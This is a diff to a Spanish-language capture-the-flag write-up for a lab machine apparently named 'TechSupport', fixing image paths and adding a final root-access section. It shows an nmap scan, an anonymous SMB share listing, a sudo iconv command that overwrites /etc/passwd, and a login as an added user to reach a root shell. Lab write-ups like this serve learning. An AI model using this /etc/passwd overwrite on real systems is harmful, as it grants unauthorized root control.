@@ -33,7 +33,7 @@ Se ejecuta el siguiente comando:
 ```bash
 nmap -p- -sV -sC 10.129.170.255
 ```
-![nmap](./imagenes/nmap.png)
+![nmap](imagenes/nmap.png)
 
 Explicación del comando:
 - -p- → Escanea los 65535 puertos
@@ -53,7 +53,7 @@ Se ejecuta el siguiente comando:
 ```bash
 smbclient -L //10.129.170.255 -N
 ```
-![SMBCLIENT](./imagenes/smbclient.png)
+![SMBCLIENT](imagenes/smbclient.png)
 
 Explicación del comando:
 - -L → Lista los recursos compartidos disponibles en el servidor
@@ -289,3 +289,26 @@ Se sobrescribe el archivo:
 ```bash
 sudo iconv -f utf-8 -t utf-8 /tmp/passwd -o /etc/passwd
 ```
+
+ ![root](./imagenes/root.png)
+
+## 11. Obtención de root
+
+```bash
+su hacker
+```
+
+Password:
+
+```bash
+pwned
+```
+
+Resultado:
+
+```bash
+root@TechSupport:~#
+```
+ ![root](./imagenes/root2.png)
+
+ Ya tenemos la máxima autorización del sistema.
